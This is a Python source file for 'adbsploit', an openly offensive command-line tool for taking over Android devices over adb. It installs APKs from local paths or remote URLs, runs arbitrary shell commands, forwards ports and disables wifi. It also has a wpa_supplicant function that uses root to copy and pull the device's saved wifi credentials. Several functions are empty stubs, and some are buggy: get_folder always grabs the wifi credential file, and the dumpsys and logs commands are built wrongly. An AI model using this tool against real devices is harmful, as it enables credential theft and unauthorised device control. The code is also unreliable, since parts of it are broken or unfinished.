"""
A tool for exploiting android devices from adb
Usage:
For usage instructions execute the following lines:
>>> python main.py -help
"""
import os
import sys
import time
import adbutils
import fire
from pyfiglet import Figlet
from rich.console import Console
from rich.table import Table
from colorama import Fore

global_device = "device"


class Utils:

    @staticmethod
    def banner():
        f = Figlet(font='slant')
        print(f.renderText('>_adbsploit'))


class Cli(object):

    def devices(self):
        Utils.banner()
        table = Table()
        table.add_column("Device detected", style="cyan")
        table.add_column("Model", style="magenta")
        table.add_column("Name", style="magenta")
        for d in adbutils.adb.device_list():
            table.add_row(d.serial, d.prop.model, d.prop.name)
        console = Console()
        console.print(table)

    def connect(self, device):
        Utils.banner()
        output = adbutils.adb.connect(device)
        print(output)

    def select(self, device):
        Utils.banner()
        output = adbutils.adb.device(serial=device)
        print("Selected device: " + Fore.GREEN + output.serial)

    def list_forward(self, device='all'):
        Utils.banner()
        table = Table()
        table.add_column("Device", style="cyan")
        table.add_column("Local Port", style="magenta")
        table.add_column("Remote Port", style="magenta")
        if device == 'all':
            # list all forwards
            for item in adbutils.adb.forward_list():
                table.add_row(item.serial, item.local, item.remote)
            console = Console()
            console.print(table)
        else:
            # list only one device forwards
            for item in adbutils.adb.forward_list(device):
                table.add_row(item.serial, item.local, item.remote)
            console = Console()
            console.print(table)

    def forward(self, device, local, remote):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.forward(local, remote)
        print(Fore.GREEN + "The port forward is now active...")

    def wifi(self, device, state):
        Utils.banner()
        d = adbutils.adb.device(device)
        if state == 'on':
            d.shell('svc wifi enable')
            print(Fore.GREEN + 'The wifi is now enabled on the device')
        else:
            d.shell('svc wifi disable')
            print(
                Fore.GREEN + 'The wifi is now disabled on the device. To turn wifi back on, you need to plugged in the device')

    def dumpsys(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        print(d.shell(device + ' dumpsys'))

    def list_apps(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        apps = d.list_packages()
        table = Table()
        table.add_column("App", style="cyan")
        for a in apps:
            table.add_row(a)
        console = Console()
        console.print(table)

    def wpa_supplicant(self, device):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.shell("su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
            d.sync.pull("/sdcard/wpa_supplicant.conf", "wpa_supplicant.conf")
            # d.shell(device + " pull /sdcard/wpa_supplicant.conf "+location)
            print(Fore.GREEN + 'WPA Supplicant exported corerctly')
        except:
            print(Fore.RED + 'An error has been ocurred grabbing the wpa_supplicant')

    def install(self, device, apk):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.install(apk)
            print(Fore.GREEN + 'APK installed successfully')
        except:
            print(Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')

    def install_remote(self, device, url):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.install_remote(url)
            print(Fore.GREEN + 'APK installed successfully')
        except:
            print(Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')

    def uninstall(self, device, app):
        try:
            Utils.banner()
            d = adbutils.adb.device(device)
            d.uninstall(app)
            print(Fore.GREEN + 'APK uninstalled successfully')
        except:
            print(
                Fore.RED + 'An error has been occurred uninstalling the APK. Check the package name or the error related')

    def shell(self, device, command):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell(command)

    def shutdown(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell('reboot -p')
        print(Fore.GREEN + 'The device is shutting down...')

    def reboot(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell('reboot')
        print(Fore.GREEN + 'The device is rebooting...')

    def restart_server(self):
        Utils.banner()
        adbutils.adb.server_kill()
        print(Fore.GREEN + 'The server is restarting...')
        adbutils.AdbClient(host="127.0.0.1", port=5037)
        print(Fore.GREEN + 'The server is started...')

    def get_folder(self, device, path, name):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.shell("su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
        d.sync.pull(path, name)

    def logs(self, device, app="all"):
        Utils.banner()
        if app == "all":
            os.system('adb -s ' + device + " logcat ")
        else:
            os.system('adb -s ' + device + " logcat " + "app")

    def start_app(self):
        Utils.banner()

    def stop_app(self):
        Utils.banner()

    def clear_app(self):
        Utils.banner()

    def show_ip(self):
        Utils.banner()

    def extract_app(self):
        Utils.banner()

    def battery(self):
        Utils.banner()

    def netstat(self):
        Utils.banner()

    def airplane(self):
        Utils.banner()

    def sound(self):
        Utils.banner()

    def keycode(self):
        Utils.banner()

    def current_app(self):
        Utils.banner()

    def send_key(self):
        Utils.banner()

    def check_screen(self):
        Utils.banner()

    def dump_hierarchy(self, device):
        Utils.banner()
        d = adbutils.adb.device(device)
        print(Fore.GREEN + d.dump_hierarchy())

    def key_event(self):
        Utils.banner()

    def open_browser(self, device, url):
        Utils.banner()
        d = adbutils.adb.device(device)
        d.open_browser(url)
        print(Fore.GREEN + 'The url is opening...')

    def remove(self):
        Utils.banner()

    def rotation(self):
        Utils.banner()

    def swipe(self):
        Utils.banner()

    def switch_screen(self):
        Utils.banner()

    def show_ip(self):
        Utils.banner()

    def show_mac(self):
        Utils.banner()

    def screenrecord(self):
        Utils.banner()

    def stream_screen(self):
        Utils.banner()

    def screenshot(self):
        Utils.banner()

    def version(self):
        """Show the version of the tool"""
        Utils.banner()
        table = Table()
        table.add_column("Version", style="cyan")
        table.add_column("URL", style="magenta")
        table.add_column("Developed", style="magenta")
        table.add_row('0.1', "https://github.com/mesquidar/adbsploit", 'Ruben Mesquida')
        console = Console()
        console.print(table)


if __name__ == '__main__':
    fire.Fire(Cli)
